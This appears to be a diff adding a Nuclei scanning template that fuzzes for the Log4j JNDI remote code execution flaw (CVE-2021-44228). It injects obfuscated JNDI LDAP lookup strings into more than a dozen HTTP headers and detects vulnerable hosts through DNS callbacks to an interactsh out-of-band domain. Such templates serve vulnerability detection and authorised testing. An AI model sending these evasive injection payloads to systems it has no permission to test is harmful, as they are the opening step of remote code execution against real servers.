@@ -1,0 +1,88 @@
+id: log4j-generic-path-fuzz
+
+info:
+  name: Log4j RCE - Path Fuzzer
+  author: aravazhimdr
+  severity: critical
+  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  reference:
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
+    - https://github.com/projectdiscovery/nuclei-templates/commit/ca6146a4afc2033f0d4d10786f3af17c736af330#diff-b7836c5cbba25b1249451cc9ab0b6afb95552688444df672c0574ebe73075115
+  tags: cve,cve2021,rce,oast,log4j
+
+requests:
+  - raw:
+      - |
+        GET /{{path}}/?auth=1&res=js HTTP/1.1
+        Host: {{Hostname}}
+        Referer: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xreferer.{{interactsh-url}}/(}
+        Upgrade-Insecure-Requests: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xupgradeinsecurerequests.{{interactsh-url}}/(}
+        User-Agent: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xuseragent.{{interactsh-url}}/(}
+        X-Api-Version: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xxapiversion.{{interactsh-url}}/(}
+
+      - |
+        GET /{{path}}/?auth=1&res=js HTTP/1.1
+        Host: {{Hostname}}
+        Accept: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xaccept.{{interactsh-url}}/(}
+        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xacceptlanguage.{{interactsh-url}}/(}
+        Accept-Encoding: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xacceptencoding.{{interactsh-url}}/(}
+        X-Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xxorigin.{{interactsh-url}}/(}
+
+      - |
+        GET /{{path}}/?auth=1&res=js HTTP/1.1
+        Host: {{Hostname}}
+        X-CSRF-Token: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xxcsrftoken.{{interactsh-url}}/(}
+        X-Druid-Comment: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xxdruidcomment.{{interactsh-url}}/(}
+        X-Forwarded-For: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xxforwardedfor.{{interactsh-url}}/(}
+
+      - |
+        GET /{{path}}/?auth=1&res=js HTTP/1.1
+        Host: {{Hostname}}
+        Authentication: Bearer ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xauthenticationbearer.{{interactsh-url}}/(}
+        Cookie: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xcookiename.{{interactsh-url}}/(}=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xcookievalue.{{interactsh-url}}/(}
+        Location: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xlocation.{{interactsh-url}}/(}
+        Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xorigin.{{interactsh-url}}/(}
+
+      - |
+        GET /{{path}}/?auth=1&res=js HTTP/1.1
+        Host: {{Hostname}}
+        Access-Control-Request-Headers: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xaccesscontrolrequestheaders.{{interactsh-url}}/(}
+        Access-Control-Request-Method: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xaccesscontrolrequestmethod.{{interactsh-url}}/(}
+        Authentication: Basic ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xauthenticationbasic.{{interactsh-url}}/(}
+        If-Modified-Since: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{path}}-xifmodifieds.{{interactsh-url}}/(}
+
+    payloads:
+      path:
+        - 'api'
+        - 'home'
+        - 'dashboard'
+        - 'login'
+    attack: batteringram
+    threads: 20
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Injection point + path
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   #  Suffix + {{Host}}
